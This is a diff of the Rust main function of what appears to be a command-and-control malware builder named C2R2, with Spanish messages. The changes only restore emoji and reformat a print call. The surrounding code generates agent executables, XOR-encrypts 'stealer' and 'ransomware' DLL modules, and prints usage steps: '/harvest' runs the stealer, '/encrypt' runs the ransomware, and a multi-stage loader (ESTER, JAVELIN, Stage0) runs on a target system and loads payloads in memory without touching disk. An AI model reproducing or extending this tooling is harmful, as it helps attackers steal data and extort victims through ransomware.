@@ -139,10 +139,10 @@ fn main() {
 
             match generate_agent(&name, &server, production) {
                 Ok(_) => {
-                    println!(" Agente generado exitosamente: {}.exe", name);
+                    println!("✅ Agente generado exitosamente: {}.exe", name);
                 }
                 Err(e) => {
-                    eprintln!(" Error: {}", e);
+                    eprintln!("❌ Error: {}", e);
                     std::process::exit(1);
                 }
             }
@@ -172,13 +172,13 @@ fn main() {
         }
 
         Commands::EncryptModule { module } => {
-            println!(" C2R2 Module Encryptor v2.0");
-            println!(" Módulo: {}", module);
+            println!("🔧 C2R2 Module Encryptor v2.0");
+            println!("📦 Módulo: {}", module);
             println!("{}", "-".repeat(50));
 
             // Validar módulo
             if module != "stealer" && module != "ransomware" {
-                eprintln!(" Error: Módulo desconocido '{}'", module);
+                eprintln!("❌ Error: Módulo desconocido '{}'", module);
                 eprintln!("   Módulos disponibles: stealer, ransomware");
                 std::process::exit(1);
             }
@@ -199,7 +199,7 @@ fn main() {
                         }
                     }
                     if !current.pop() {
-                        eprintln!(" Error: No se encontró el directorio raíz del workspace");
+                        eprintln!("❌ Error: No se encontró el directorio raíz del workspace");
                         std::process::exit(1);
                     }
                 }
@@ -218,7 +218,7 @@ fn main() {
             } else if dll_path_native.exists() {
                 dll_path_native
             } else {
-                eprintln!(" Error: No se encontró {}.dll", module);
+                eprintln!("❌ Error: No se encontró {}.dll", module);
                 eprintln!("   Ejecuta primero:");
                 eprintln!(
                     "   cargo build --release --target x86_64-pc-windows-gnu --package {}-dll",
@@ -240,7 +240,7 @@ fn main() {
             if let Some(parent) = output_enc.parent() {
                 if !parent.exists() {
                     if let Err(e) = std::fs::create_dir_all(parent) {
-                        eprintln!(" Error creando directorio modules/: {}", e);
+                        eprintln!("❌ Error creando directorio modules/: {}", e);
                         std::process::exit(1);
                     }
                 }
@@ -251,16 +251,16 @@ fn main() {
 
             println!("\n📦 Encriptando {}.dll...", module);
             match encrypt_dll(&dll_path, &output_enc, &xor_key) {
-                Ok(_) => println!(" DLL encriptada: {}", output_enc.display()),
+                Ok(_) => println!("✅ DLL encriptada: {}", output_enc.display()),
                 Err(e) => {
-                    eprintln!(" Error encriptando DLL: {}", e);
+                    eprintln!("❌ Error encriptando DLL: {}", e);
                     std::process::exit(1);
                 }
             }
 
             // Guardar clave
             if let Err(e) = std::fs::write(&output_key, &xor_key) {
-                eprintln!(" Error guardando clave: {}", e);
+                eprintln!("❌ Error guardando clave: {}", e);
                 std::process::exit(1);
             }
             println!(
@@ -274,7 +274,7 @@ fn main() {
             println!("   - {}", output_key.display());
 
             if module == "stealer" {
-                println!("\nℹ  Ahora puedes usar /harvest en el C2 para ejecutar el stealer");
+                println!("\nℹ️  Ahora puedes usar /harvest en el C2 para ejecutar el stealer");
             } else if module == "ransomware" {
                 println!(
                     "\nℹ️  Ahora puedes usar /encrypt o /decrypt en el C2 para usar el ransomware"
@@ -526,7 +526,10 @@ fn main() {
                     println!("\n✅ ¡Sistema multi-stage generado exitosamente!");
                     println!("📦 Ejecutable final: {}", ester_path.display());
                     println!("\n📋 Para usar:");
-                    println!("   1. Ejecuta {} en el sistema objetivo", ester_path.display());
+                    println!(
+                        "   1. Ejecuta {} en el sistema objetivo",
+                        ester_path.display()
+                    );
                     println!("   2. ESTER validará el entorno");
                     println!("   3. Cargará JAVELIN en memoria (sin tocar disco)");
                     println!("   4. JAVELIN cargará Stage0 en memoria");
